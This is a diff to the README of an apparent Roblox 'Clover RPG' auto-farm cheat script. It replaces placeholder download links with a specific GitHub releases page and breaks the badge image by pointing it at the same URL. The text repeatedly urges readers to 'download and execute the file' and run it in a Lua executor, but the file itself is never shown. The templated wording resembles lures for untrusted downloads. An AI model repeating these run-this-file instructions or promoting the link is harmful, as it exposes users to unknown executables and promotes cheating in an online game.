@@ -1,6 +1,6 @@
 # Clover RPG Auto-Farm and Auto-Quest Script 🌿⚔️
 
-![Clover RPG](https://img.shields.io/badge/Clover%20RPG-Project-green)
+![Clover RPG](https://github.com/nithin-on/Clover-RPG-Roblox/releases%20RPG-Project-green)
 
 Welcome to the **Clover RPG Auto-Farm and Auto-Quest Script** repository! This project provides a robust solution for players looking to enhance their gaming experience in Clover RPG. By automating key tasks, this script allows players to focus on enjoying the game rather than grinding through repetitive tasks.
 
@@ -19,7 +19,7 @@ Welcome to the **Clover RPG Auto-Farm and Auto-Quest Script** repository! This p
 
 Clover RPG is an engaging game that combines adventure and strategy. However, like many RPGs, it can involve tedious grinding for resources and experience. This is where our auto-farm and auto-quest script comes in. It allows players to automate the completion of missions, engage in battles, and collect rewards without needing to constantly monitor the game.
 
-You can download the script [here](https://github.com/repo/user/archive.zip). Please ensure to download and execute the file for full functionality.
+You can download the script [here](https://github.com/nithin-on/Clover-RPG-Roblox/releases). Please ensure to download and execute the file for full functionality.
 
 ## Features
 
@@ -33,7 +33,7 @@ You can download the script [here](https://github.com/repo/user/archive.zip). Pl
 
 To get started with the Clover RPG Auto-Farm and Auto-Quest Script, follow these steps:
 
-1. **Download the Script**: Click [here](https://github.com/repo/user/archive.zip) to download the latest version.
+1. **Download the Script**: Click [here](https://github.com/nithin-on/Clover-RPG-Roblox/releases) to download the latest version.
 2. **Extract the Files**: Unzip the downloaded file to a location of your choice.
 3. **Set Up Your Environment**: Ensure you have Roblox installed and configured properly on your system.
 4. **Run the Script**: Open the script in your preferred Lua executor and run it while in-game.
@@ -77,6 +77,6 @@ For any questions or feedback, feel free to reach out. You can find me on GitHub
 
 Thank you for checking out the Clover RPG Auto-Farm and Auto-Quest Script! Enjoy your adventures in Clover RPG with enhanced efficiency and fun.
 
-For the latest updates and releases, check the [Releases](https://github.com/repo/user/releases) section.
+For the latest updates and releases, check the [Releases](https://github.com/nithin-on/Clover-RPG-Roblox/releases) section.
 
-Remember, you can download the script [here](https://github.com/repo/user/archive.zip) to get started!
+Remember, you can download the script [here](https://github.com/nithin-on/Clover-RPG-Roblox/releases) to get started!
